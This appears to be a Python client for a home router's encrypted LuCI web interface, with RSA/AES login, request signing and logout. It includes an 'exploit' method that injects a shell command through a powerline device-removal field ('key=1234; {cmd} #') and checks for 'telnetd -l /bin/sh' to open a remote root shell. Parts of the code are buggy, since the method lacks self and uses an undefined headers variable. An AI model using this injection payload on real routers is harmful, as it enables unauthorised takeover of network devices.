#!/bin/env python3


import argparse
import base64
import hashlib
import json
import requests
# from Crypto.Cipher import AES

# from Crypto.Cipher import PKCS1_OAEP
import Crypto
import Crypto.Cipher
import Crypto.Cipher.PKCS1_v1_5
import Crypto.Cipher.AES
import Crypto.Hash
import Crypto.PublicKey
import Crypto.PublicKey.RSA
# from Crypto.Hash import SHA256
# from Crypto.PublicKey import RSA
# from Crypto.Signature import PKCS1_v1_5



class RouterRestClient:
	# These parameters are set by the browser, so we can decide their value
	aeskey = b'1527039873676296'
	iv = b'1527039905151470'

	RSA_data_key = None
	RSA_pwd_key = None
	session = None
   
	target = None
	password = None
	stok = ''

	def __init__(self, target, password):
		self.target = target
		self.password = password

	def aes_encrypt(self, plaintext, isbase64):
		padded = self.pad(plaintext)
		cipher = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, self.iv)
		encrypted = cipher.encrypt(padded.encode('utf-8'))
		if isbase64:
			return base64.b64encode(encrypted).decode('utf-8')
		else:
			return encrypted.hex()

	def aes_decrypt(self, encrypted, isbase64):
		raw = base64.b64decode(encrypted) if isbase64 else bytes.fromhex(encrypted)
		cipher = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, self.iv)
		plaintext = cipher.decrypt(raw)
		return plaintext[:-ord(plaintext[len(plaintext) - 1:])].decode('utf-8')
		# print(plaintext)
		# return plaintext.decode('utf-8')


	def pad(self, plaintext):
		blocksize = Crypto.Cipher.AES.block_size
		pad = blocksize - len(plaintext) % blocksize
		return plaintext + pad * chr(pad) 


	def get_rsa_keys(self):
		r = requests.post(f"http://{self.target}/cgi-bin/luci/;stok=/login?form=auth", data={"operation": "read"})
		
		data = r.json()
		# print(r)
		if not data.get("success"):
			raise Exception("Something went wrong, couldn't retrieve RSA data key")
		n = int(data["data"]["key"][0], 16)
		e = int(data["data"]["key"][1], 16)
		seq = int(data["data"]["seq"])

		self.RSA_data_key = Crypto.PublicKey.RSA.construct((n,e))
		self.seq = seq

		r = requests.post(f"http://{self.target}/cgi-bin/luci/;stok=/login?form=keys", data={"operation": "read"})
		
		data = r.json()
		# print(r)
		if not data.get("success"):
			raise Exception("Something went wrong, couldn't retrieve RSA password key")
		n = int(data["data"]["password"][0], 16)
		e = int(data["data"]["password"][1], 16)

		self.RSA_pwd_key = Crypto.PublicKey.RSA.construct((n,e))



	def send_encrypted_request(self, path, plaintext_data, is_login=False):
		url = f"http://{self.target}{path}"
		encrypted_data = self.aes_encrypt(plaintext_data, True)
		m = hashlib.md5()
		m.update(('admin'+self.password).encode('utf-8'))
		password_hash = m.hexdigest()
		if is_login:
			s = "k={}&i={}&h={}&s={}".format(self.aeskey.decode('utf-8'), self.iv.decode('utf-8'), password_hash, self.seq + len(encrypted_data))
		else:
			s = "h={}&s={}".format(password_hash, self.seq + len(encrypted_data))
		
		sign = ""
		pos = 0
		while pos < len(s):
			sign = sign + self.rsaEncrypt(self.RSA_data_key, s[pos:pos+53])
			pos = pos + 53;
	   

		data = {
			"sign": sign,
			"data": encrypted_data
		}
		# print(data)
		

		r = self.session.post(url, data=data, headers=headers)
		print(f'Status code = {r.status_code}')

		data= r.json()
		# print(data)
		encrypted_data = data.get("data")
		response = self.aes_decrypt(encrypted_data, True)
		print(response)
		
		return json.loads(response)




	def login(self):
		self.session = requests.Session()

		encryptedPwd = self.rsaEncrypt(self.RSA_pwd_key, self.password)
		data =  self.send_encrypted_request("/cgi-bin/luci/;stok=/login?form=login", f"password={encryptedPwd}&operation=login",
								  True)
		if not data.get("success"):
			self.session = None
			raise Exception("Login failed!")
			
		self.stok = data['data']['stok']
		print("[+] Login")
			

	def logout(self):
		data = self.apiCall("logout", "read")
		self.stok = ''
		self.session = None
		if not data.get("success"):
			raise Exception("logout failed!")

		print("[+] Logout")

	def apiCall(self, form, operation):
		data = self.send_encrypted_request(f"/cgi-bin/luci/;stok={self.stok}/admin/system?form={form}", "operation={operation}")
		if not data.get("success"):
			raise Exception("logout failed!")
		return data

	def reboot(self):
		data = self.apiCall("reboot", "reboot")


	def exploit(target, password, cmd):
		print("[+] Sending exploit. This will take a some seconds, please be patient!")
		if send_encrypted_request("/admin/powerline?form=plc_device", "operation=remove&key=1234; {} #".format(cmd)
								  ):
			print("[+] Exploit executed successfully")
			if cmd == "telnetd -l /bin/sh":
				print("[+] Now you can connect to the device with the following command:\n    telnet {}".format(target))
		else:
			print("[!] Failed to execute exploit")



	def rsaEncrypt(self, public_key, text):
			raw = text.encode('utf-8')
			cipher = Crypto.Cipher.PKCS1_v1_5.new(public_key)#, 
			cipher._randfunc = lambda n:(n*'\x40').encode('utf-8')
			return cipher.encrypt(raw).hex()

	def rsaDecrypt(self, private_key, enc):
			cipher = Crypto.Cipher.PKCS1_v1_5.new(private_key)#, hashAlgo=SHA256
			return cipher.decrypt(bytes.fromhex(enc), 'sentinel').decode("utf-8")

	# def decryptBase64(private_key, enc):
	#         cipher = Crypto.Cipher.PKCS1_v1_5.new(private_key)#, hashAlgo=SHA256
	#         return cipher.decrypt(base64.b64decode(enc)).decode("utf-8")
	# def sign(private_key, text):
	#     hash_value = Crypto.Hash.MD5.new(text)
	#     signer = Crypto.Cipher.PKCS1_v1_5.PKCS1_v1_5.new(private_key)
	#     signature = signer.sign(hash_value)
	#     return base64.b64encode(signature)


	# def verify(key, text, signature):
	#         public_key = RSA.importKey(base64.b64decode(key))
	#         hash_value = SHA256.new(text)
	#         verifier = PKCS1_v1_5.new(public_key)
	#         return verifier.verify(hash_value, base64.b64decode(signature))

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='')
	parser.add_argument('-t', '--target', type=str,  help='IP of the Router')
	parser.add_argument('-p', '--password', type=str, metavar='password',
						help='Password of the Router Web interface (default: admin)', default='admin')
	# 
	args = parser.parse_args()
	restClient = RouterRestClient(args.target, args.password)
	restClient.get_rsa_keys()
	restClient.login()
	# restClient.reboot()
	restClient.logout()
